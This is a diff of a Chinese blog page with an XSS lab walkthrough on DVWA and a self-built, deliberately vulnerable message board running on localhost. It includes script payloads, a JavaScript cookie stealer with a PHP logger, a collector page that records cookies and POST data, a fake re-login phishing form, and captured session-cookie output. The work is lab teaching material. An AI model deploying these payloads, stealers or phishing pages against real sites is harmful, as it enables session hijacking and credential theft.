@@ -179,29 +179,43 @@
 <h5 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h5><p>DVWA     等级low</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181529336.png" alt="image-20250518152910272"></p>
 <p>尝试输入最简单的弹窗payload</p>
-<p>&lt;!–code￼0–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181530775.png" alt="image-20250518153016694"></p>
 <p>弹窗成功</p>
 <p>查看源码</p>
-<p>&lt;!–code￼1–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-</p>
+<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Is there any input?</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// Feedback for end user</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre>Hello '</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>简单的get传参,参数为name，无任何过滤</p>
 <p>本地利用xss获得cookie值</p>
 <p>hacker.js</p>
-<p>&lt;!–code￼2–&gt;
+<pre class="line-numbers language-none"><code class="language-none">var img &#x3D; new Image();
+img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;xss_r&#x2F;hacker.php?x&#x3D;&quot; + document.cookie;
+document.body.append(img);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>hacker.php</p>
-<p>&lt;!–code￼3–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$cookie &#x3D; $_GET[&#39;x&#39;];
+$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);
+$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);
+$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);
+fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);
+fclose($fp);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>构造一个payload</p>
-<p>&lt;!–code￼4–&gt;
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;hacker.js&quot; &#x2F;&gt;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>发送给其他用户进行访问，并输入自己的名字（安全等级为low）</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181637357.png" alt="image-20250518163738310"></p>
 <p>先登录另一个用户</p>
@@ -211,9 +225,9 @@
 <p>xss_r目录下面多了一个cookie.txt文件</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181643989.png" alt="image-20250518164352955"></p>
 <p>成功得到了另一个用户的cookie值</p>
-<p>&lt;!–code￼5–&gt;
+<pre class="line-numbers language-none"><code class="language-none">IP: ::1Date: 2025-05-18 4:40:28 Cookie:PHPSESSID&#x3D;qju48o1h63s6n78olt15h1o8sb; security&#x3D;low
+IP: ::1Date: 2025-05-18 4:41:22 Cookie:PHPSESSID&#x3D;qju48o1h63s6n78olt15h1o8sb; security&#x3D;low<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</p>
 <p>拿到了其他用户的cookie值那么怎么登陆到其他用户呢？</p>
 <p>首先进入到靶场的登陆页面</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181646644.png" alt="image-20250518164619598"></p>
@@ -225,33 +239,127 @@
 <p>config.php进行数据库配置或者直接创建数据库，并创建表</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505272130919.png" alt="image-20250527213027883"></p>
 <p>index.php是有漏洞的留言板</p>
-<p>&lt;!–code￼6–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>
 
-</p>
+<span class="token comment">// 处理留言提交</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO messages (content) VALUES ('<span class="token interpolation"><span class="token variable">$message</span></span>')"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"留言提交失败: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// 防止重复提交</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: "</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 获取留言</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT content FROM messages ORDER BY id DESC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>留言板<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+        <span class="token selector">body</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token property">max-width</span><span class="token punctuation">:</span> 800px<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 0 auto<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+        <span class="token selector">.message</span> <span class="token punctuation">&#123;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 15px 0<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span> <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #ddd<span class="token punctuation">;</span> <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+        <span class="token selector">textarea</span> <span class="token punctuation">&#123;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span> <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>留言板系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入留言内容...<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交留言<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>留言列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
+        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- 故意保留XSS漏洞 --></span>
+        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endwhile</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
+    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>暂无留言<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>攻击者收集信息的页面(attacker.php)</p>
-<p>&lt;!–code￼7–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// 记录访问信息</span>
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" | IP: "</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"User-Agent: "</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Referer: "</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'无'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Cookies: "</span><span class="token operator">.</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"GET参数: "</span><span class="token operator">.</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"POST参数: "</span><span class="token operator">.</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">.=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"-"</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
 
-</p>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'attack_log.txt'</span><span class="token punctuation">,</span> <span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 重定向到钓鱼页面</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: phishing/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>钓鱼网站的页面</p>
-<p>&lt;!–code￼8–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;系统安全验证&lt;&#x2F;title&gt;
+    &lt;style&gt;
+        body &#123; font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; &#125;
+        .login-box &#123; border: 1px solid #ddd; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); &#125;
+        input &#123; width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; &#125;
+        button &#123; background-color: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; &#125;
+        .warning &#123; color: red; font-weight: bold; margin-bottom: 20px; &#125;
+    &lt;&#x2F;style&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+    &lt;div class&#x3D;&quot;login-box&quot;&gt;
+        &lt;h2&gt;系统安全验证&lt;&#x2F;h2&gt;
+        &lt;p class&#x3D;&quot;warning&quot;&gt;⚠️ 您的账户存在异常访问，请重新登录验证身份&lt;&#x2F;p&gt;
 
-</p>
+        &lt;form action&#x3D;&quot;..&#x2F;attacker.php&quot; method&#x3D;&quot;POST&quot;&gt;
+            &lt;label for&#x3D;&quot;username&quot;&gt;用户名:&lt;&#x2F;label&gt;
+            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot; required&gt;
+
+            &lt;label for&#x3D;&quot;password&quot;&gt;密码:&lt;&#x2F;label&gt;
+            &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; required&gt;
+
+            &lt;button type&#x3D;&quot;submit&quot;&gt;立即验证&lt;&#x2F;button&gt;
+        &lt;&#x2F;form&gt;
+
+        &lt;p style&#x3D;&quot;margin-top: 20px; font-size: 12px; color: #777;&quot;&gt;
+            如果您遇到任何问题，请联系系统管理员。
+        &lt;&#x2F;p&gt;
+    &lt;&#x2F;div&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h5 id="漏洞实践"><a href="#漏洞实践" class="headerlink" title="漏洞实践"></a>漏洞实践</h5><p>访问留言板</p>
-<p>&lt;!–code￼9–&gt;
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;xss-demo&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>输入下面的代码当作留言，提交留言</p>
-<p>&lt;!–code￼10–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+window.location.href &#x3D; &#39;attacker.php?from&#x3D;xss&amp;cookie&#x3D;&#39; + encodeURIComponent(document.cookie);
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>再重新访问留言板</p>
 <p>页面跳转到下面的页面即钓鱼网站的页面，即假装网页的登陆失效要求用户重新登陆</p>
 <p>用户只要输入并且进验证的话就会将账号和密码等信息收集储存起来</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015092.png" alt="image-20250528001500039"></p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015162.png" alt="image-20250528001529126"></p>
-<h5 id="恶意脚本解释"><a href="#恶意脚本解释" class="headerlink" title="恶意脚本解释"></a><strong>恶意脚本解释</strong></h5><p>&lt;!–code￼11–&gt;
+<h5 id="恶意脚本解释"><a href="#恶意脚本解释" class="headerlink" title="恶意脚本解释"></a><strong>恶意脚本解释</strong></h5><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+window.location.href &#x3D; &#39;attacker.php?from&#x3D;xss&amp;cookie&#x3D;&#39; + encodeURIComponent(document.cookie);
+&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p><strong>首先是<code>window.location.href</code> 操作</strong></p>
 <p>作用是修改当前的窗口的url，跳转到新的页面(使用户在不知道的情况下面被群迫进行了网页的重定向)</p>
 <p><strong>attacker.php</strong></p>
